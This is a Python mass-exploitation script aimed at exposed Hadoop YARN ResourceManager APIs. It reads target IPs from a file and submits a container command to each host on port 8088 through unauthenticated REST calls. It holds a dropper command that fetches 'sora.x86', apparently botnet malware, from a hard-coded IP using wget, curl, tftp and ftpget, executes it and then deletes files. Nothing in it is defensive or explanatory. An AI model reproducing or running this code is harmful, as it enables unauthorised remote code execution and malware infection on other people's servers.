import subprocess
import sys
import threading
import requests
import os
from queue import *
from threading import Thread

ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
cmd='cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.114.80/bins/sora.x86; curl -O http://196.251.114.80/bins/sora.x86; chmod 777 sora.x86; sh sora.x86; tftp 196.251.114.80 -c get sora.x86; chmod 777 sora.x86; sh sora.x86; tftp -r sora.x86 -g 196.251.114.80; chmod 777 sora.x86; sh sora.x86; ftpget -v -u anonymous -p anonymous -P 21 196.251.114.80 sora.x86 sora.x86; sh sora.x86; rm -rf sora.x86 sora.x86 sora.x86 sora.x86; rm -rf *'

def run(cmd):
    subprocess.call(cmd, shell=True)

def rtek(host, cmd='id'):
    try:
        url1 = f'http://{host}:8088/ws/v1/cluster/apps/new-application'
        resp1 = requests.post(url1, timeout=3)
        if resp1.status_code != 200:
            return
        app_id = resp1.json().get('application-id')
        if not app_id:
            return
        url2 = f'http://{host}:8088/ws/v1/cluster/apps'
        data = {
            'application-id': app_id,
            'application-name': 'get-shell',
            'am-container-spec': {
                'commands': {
                    'command': f'{cmd}',
                },
            },
            'application-type': 'application/x-www-form-urlencoded',
        }
        resp2 = requests.post(url2, json=data, timeout=3)
        if resp2.status_code == 200:
            print("[OK] -", host)
    except:
        pass

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=rtek, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return

if __name__ == "__main__":
    main()
    
